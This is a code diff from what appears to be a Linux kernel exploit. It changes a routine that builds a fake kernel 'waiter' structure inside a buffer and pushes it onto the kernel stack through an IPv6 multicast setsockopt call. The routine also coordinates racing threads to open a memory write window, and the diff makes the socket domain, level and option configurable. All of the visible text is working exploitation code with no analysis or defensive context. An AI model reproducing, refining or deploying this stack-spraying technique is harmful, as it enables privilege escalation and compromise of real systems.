@@ -491,6 +491,15 @@ void slide_pselect_stack_copy(void) {
 #if defined(SLIDE_STACK_WRITER) && \
     defined(SLIDE_STACK_WRITER_MCAST) && \
     SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
+#ifndef SLIDE_MCAST_DOMAIN
+#define SLIDE_MCAST_DOMAIN AF_INET6
+#endif
+#ifndef SLIDE_MCAST_LEVEL
+#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
+#endif
+#ifndef SLIDE_MCAST_OPTION
+#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
+#endif
 static void slide_mcast_stack_copy(void) {
   enum { stamp_size = 0x108 };
   _Static_assert(MCAST_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= stamp_size,
@@ -501,7 +510,7 @@ static void slide_mcast_stack_copy(void) {
   memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
   slide_build_fake_waiter(stamp, MCAST_WAITER_OFF);
 
-  int fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  int fd = socket(SLIDE_MCAST_DOMAIN, SOCK_DGRAM | SOCK_CLOEXEC, 0);
   if (fd < 0) {
     pr_error("slide mcast socket errno=%d\n", errno);
     return;
@@ -510,7 +519,7 @@ static void slide_mcast_stack_copy(void) {
   slide_reset_consume_state();
 
   errno = 0;
-  int ret = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
+  int ret = setsockopt(fd, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
                        stamp, sizeof(stamp));
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 1);
@@ -521,8 +530,10 @@ static void slide_mcast_stack_copy(void) {
   int sched_ok = atomic_load(&slide_consume_sched_ok);
   atomic_store(&slide_pselect_write_window,
                ret == -1 && saved_errno == EADDRNOTAVAIL && sched_ok > 0);
-  pr_info("slide mcast returned offset=%#x ret=%d errno=%d "
+  pr_info("slide mcast returned domain=%d level=%d option=%d "
+          "offset=%#x ret=%d errno=%d "
           "calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
+          SLIDE_MCAST_DOMAIN, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
           MCAST_WAITER_OFF, ret, saved_errno,
           atomic_load(&slide_consume_calls), sched_ok,
           atomic_load(&slide_consume_last_sched_ret),
